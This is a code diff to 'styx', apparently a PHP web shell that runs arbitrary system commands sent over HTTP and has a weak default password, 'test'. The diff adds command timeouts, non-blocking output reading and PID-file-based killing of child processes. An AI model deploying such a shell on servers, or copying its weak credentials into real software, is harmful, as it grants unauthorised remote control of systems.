@@ -4,6 +4,7 @@ $SHELL_CONFIG = array(
     'username' => 'styx',
     'hostname' => 'shell',
     'password' => 'test', // set non-empty to enable HTTP Basic auth
+    'timeout' => 300, // hard cap (seconds) per command; 0 disables. Use 0 only on trusted environments
 );
 
 function expandPath($path) {
@@ -48,6 +49,10 @@ function allFunctionExist($list = array()) {
 }
 
 function getExecuteFunctionName() {
+    // proc_open first: it is the only interruptible path (Ctrl+C support)
+    if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
+        return 'proc_open';
+    }
     if (function_exists('exec')) {
         return 'exec';
     }
@@ -63,13 +68,10 @@ function getExecuteFunctionName() {
     if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
         return 'popen';
     }
-    if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
-        return 'proc_open';
-    }
     return null;
 }
 
-function executeCommand($cmd, &$proc = null) {
+function executeCommand($cmd) {
     $output = '';
     switch (getExecuteFunctionName()) {
         case 'exec':
@@ -98,14 +100,67 @@ function executeCommand($cmd, &$proc = null) {
             break;
         case 'proc_open':
             $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
-            if ($proc !== null) {
-                $proc = $handle;
-            }
-            $output = stream_get_contents($pipes[1]);
+            $output = readProcessOutput($handle, $pipes);
             proc_close($handle);
+            @unlink(sys_get_temp_dir() . '/styx-proc.pid');
             break;
     }
     return $output;
+}
+
+// non-blocking read loop: stream_get_contents would ignore PHP time limits and
+// let a never-ending orphan command tie up a worker forever (shared hosting!)
+function readProcessOutput($handle, $pipes) {
+    global $SHELL_CONFIG;
+    global $SHELL_PID;
+    $output = '';
+    $status = proc_get_status($handle);
+    $SHELL_PID = $status['pid'];
+    if ($status['pid'] > 0) {
+        file_put_contents(sys_get_temp_dir() . '/styx-proc.pid', (string) $status['pid']);
+    }
+    stream_set_blocking($pipes[1], false);
+    $deadline = time() + (int) $SHELL_CONFIG['timeout'];
+    while (true) {
+        $read = array($pipes[1]);
+        $write = null;
+        $except = null;
+        stream_select($read, $write, $except, 0, 300000);
+        if (in_array($pipes[1], $read, true)) {
+            $chunk = fread($pipes[1], 8192);
+            if ($chunk === false || ($chunk === '' && feof($pipes[1]))) {
+                break;
+            }
+            if ($chunk !== '') {
+                $output .= $chunk;
+            }
+        }
+        if ($SHELL_CONFIG['timeout'] > 0 && time() >= $deadline) {
+            $output .= "\n[styx] terminated: command exceeded the {$SHELL_CONFIG['timeout']}s timeout.";
+            if (!terminatePidTree($SHELL_PID)) {
+                $output .= " Could not send SIGTERM (posix extension unavailable); process may still be running.";
+            }
+            break;
+        }
+    }
+    return $output;
+}
+
+function terminatePidTree($pid) {
+    if (!(function_exists('posix_kill') && $pid > 0)) {
+        return false;
+    }
+    // ponytail: sh neither relays SIGTERM nor sets a process group; kill children first,
+    // otherwise they hold the output pipe open and the request hangs until the children exit
+    $children = array_filter(explode("\n", trim((string) executeCommand('pgrep -P ' . $pid))));
+    foreach ($children as $childPid) {
+        $childPid = (int) $childPid;
+        if ($childPid > 0) {
+            posix_kill($childPid, 15); // SIGTERM
+        }
+    }
+    posix_kill($pid, 15);
+    return true;
 }
 
 function isRunningWindows() {
@@ -127,8 +182,7 @@ function featureShell($cmd, $cwd) {
         return featureDownload($match[1]);
     } else {
         @chdir($cwd);
-        $GLOBALS['SHELL_PROC'] = null;
-        $stdout = executeCommand($cmd, $GLOBALS['SHELL_PROC']);
+        $stdout = executeCommand($cmd);
     }
 
     return array(
@@ -243,13 +297,20 @@ if (isset($_GET["feature"])) {
             $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
             break;
         case 'kill':
-            $proc = isset($GLOBALS['SHELL_PROC']) ? $GLOBALS['SHELL_PROC'] : null;
-            // ponytail: only proc_open-based commands are interruptible; under single-threaded php -S the kill request arrives too late
-            if ($proc !== null) {
-                @proc_terminate($proc);
+            $pidFile = sys_get_temp_dir() . '/styx-proc.pid';
+            $message = '';
+            // kill by PID file: proc handle lives in another server worker, so proc_terminate across workers is impossible
+            if (is_file($pidFile)) {
+                $pid = (int) file_get_contents($pidFile);
+                if (!terminatePidTree($pid)) {
+                    $message = 'Cannot interrupt: posix extension or PID is unavailable.';
+                }
+                @unlink($pidFile);
+            } else {
+                $message = 'Nothing to interrupt (command not interruptible).';
             }
             $response = array(
-                'stdout' => base64_encode($proc !== null ? '' : 'Nothing to interrupt (command not interruptible).'),
+                'stdout' => base64_encode($message),
                 'cwd' => base64_encode(getcwd())
             );
             break;
